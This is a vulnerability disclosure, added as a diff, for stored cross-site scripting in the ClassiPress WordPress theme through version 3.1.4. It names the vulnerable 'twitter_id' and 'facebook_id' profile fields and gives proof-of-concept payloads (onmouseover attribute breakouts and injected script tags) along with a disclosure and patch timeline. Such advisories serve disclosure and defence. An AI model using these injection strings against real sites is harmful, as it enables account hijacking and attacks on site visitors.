@@ -1,0 +1,49 @@
+# Exploit Title: WordPress Classipress Theme <= 3.1.4 Stored XSS
+# Date: 2011-09-26
+# Author: Paul Loftness
+# Contact:http://attackvectorlabs.blogspot.com
+# Vendor: Appthemes LLc. 
+# Product Web Page: http://www.appthemes.com/themes/classipress/
+# Version: <=3.1.4
+# Tested Versions: 3.1.4, 3.0.5.3
+
+Summary:
+-------------------------
+ClassiPress is a popular and widely used classified ads software for WordPress. 
+
+Description: 
+-------------------------
+Classipress is vulnerable to multiple stored XSS vulnerabilities.  Input through the POST parameters 'facebook_id' and 'twitter_id' in a registered user's profile page is either not sanitisized or poorly sanitised (version specific) allowing the attacker to insert Javascript code. 
+
+In version 3.0.5.2 and presumably all previous versions, no sanitation is in place, allowing an attacker to insert code within a tag or to break out of it.  In version 3.1.4, the less-than character is sanitised but an attacker can still insert quotes and place an event handler in the tag.  
+
+
+Proof-of-Concept Code:
+-------------------------
+
+Insertion page: http://example_site/author/profile/
+Infected page : http://example_site/author/attacker_username/
+Note: Some sites replace "author" with another path, this is not a vanilla configuration, however. 
+
+Version: ClassiPress 3.0.5.2
+Vulnerable Input Parameters:
+
+	twitter_id:  " onmouseover="alert('XSS');
+	facebook_id: " onmouseover="alert('XSS');
+    Alternate Exploit code:
+	twitter_id:  "><script>alert('XSS');</script><div id="
+	facebook_id: "><script>alert('XSS');</script><div id="
+
+
+Version: ClassiPress 3.1.4
+Vulnerable Input Parameters:
+	
+	twitter_id:  " onmouseover='alert("XSS");'><
+	facebook_id: " onmouseover='alert("XSS");'><
+
+
+Timeline:
+-------------------------
+Vulnerability Discovered: 8/10/2011
+Vulnerability Reported to Vendor: 9/1/2011
+Patch Released with version 3.1.5: 10/7/2011
